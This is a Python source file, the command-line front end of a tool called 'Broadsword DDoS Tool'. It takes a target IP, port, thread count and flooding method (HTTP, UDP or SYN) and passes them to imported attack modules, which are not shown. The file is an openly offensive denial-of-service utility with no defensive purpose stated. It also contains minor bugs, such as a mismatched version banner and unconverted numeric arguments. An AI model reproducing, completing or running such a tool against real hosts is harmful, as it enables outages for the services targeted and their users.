# Broadsword DDoS Tool
# Version 1.0.2
# By Brandon Hammond

# Set the version and author
__version__ = "1.0.2"
__author__ = "Brandon Hammond"

# Import required modules
import os
import sys
import getopt
import threading
import socket
import core.http as broadsword_http
import core.udp as broadsword_udp
import core.syn as broadsword_syn

# Define the main() function
def main():
	# Function: main()
	# Purpose: Process command line arguments and provide base workflow
	
	# Attempt to call getopt.getopt()
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hvm:i:p:t:", ["help", "version", "method=", "ip=", "port=", "threads="])
	except getopt.GetoptError as err_msg:
		# Display error message and exit
		print("[E] Error parsing command line arguments: {}!".format(err_msg))
		
	# Predefine variables with their default values
	attack_method = "http"
	target_ip = None
	target_port = 80
	attack_threads = 10

	# Build for loop to parse options
	for opt, arg in opts:
		# If -h or --help option used
		if opt in ("-h", "--help"):
			# Print help message and exit
			print("USAGE:")
			print("\tbroadsword [-h] [-v] [-m METHOD] [-i IP] [-p PORT] [-t THREADS]")
			print("")
			print("DDoS utility that supports HTTP, UDP, and SYN flooding, as well as multithreading.")
			print("")
			print("REQUIRED ARGUMENTS:")
			print("\t-i, --ip ip\tSpecify the IP to flood")
			print("")
			print("OPTIONAL ARGUMENTS:")
			print("\t-h, --help\tDisplay this message and exit")
			print("\t-v, --version\tDisplay version info and exit")
			print("\t-m, --method method\tSpecify the DDoS method. Default is HTTP")
			print("\t-p, --port port\tSpecify the port to attack. For a UDP random port use 0. Default is 80")
			print("\t-t, --threads threads\tSpecify how many threads to use. Default is 10")
			exit(0)
		
		# If -v or --version option is used
		elif opt in ("-v", "--version"):
			# Print version message and exit
			print("Broadsword DDoS Tool")
			print("Version {}".format(__version__))
			print("By {}".format(__author__))
			exit(0)
			
		# If -m or --method option is used
		elif opt in ("-m", "--method"):
			# Make sure the method is supported
			if arg in ("http", "udp", "syn"):
				attack_method = arg
			else:
				# Display error message and exit
				print("[E] Unsupported DDoS method!")
				exit(0)
				
		# If -i or --ip option is used
		elif opt in ("-i", "--ip"):
			# Set the target IP
			target_ip = arg
			
		# If -p or --port option is used
		elif opt in ("-p", "--port"):
			# Set the target port
			target_port = arg
			
		# If -t or --threads option is used
		elif opt in ("-t", "--threads"):
			# Set the number of threads to use
			attack_threads = arg
			
		# If an invalid option was used
		else:
			# Display error message and exit
			print("[E] Invalid option specified!")
			exit()
			
	# Begin main workflow
			
	# Display the banner
	print("==============================")
	print("Broadsword DDoS Tool v1.0.0")
	print("==============================")
	print("[+] Method: {}".format(attack_method.upper()))
	print("[+] Target IP: {}".format(target_ip))
	if attack_method == "udp" and target_port == 0:
		print("[+] Target Port: Random")
	else:
		print("[+] Target Port: {}".format(target_port))
	print("[+] Threads: {}".format(attack_threads))
	print("==============================")
	print("[I] Attacking...")
	
	# Determine what method is to be used
	if attack_method == "http":
		# Set attack to use HTTP
		attack = broadsword_http
		
	elif attack_method == "udp":
		# Set attack to use UDP
		attack = broadsword_udp
		
	elif attack_method == "syn":
		# Set attack to use SYN
		attack = broadsword_syn
		
	# Call attack()
	attack.begin(attack_threads, target_ip, target_port)
	
# Make sure not running as module and call main()
if __name__ == "__main__":
	main()
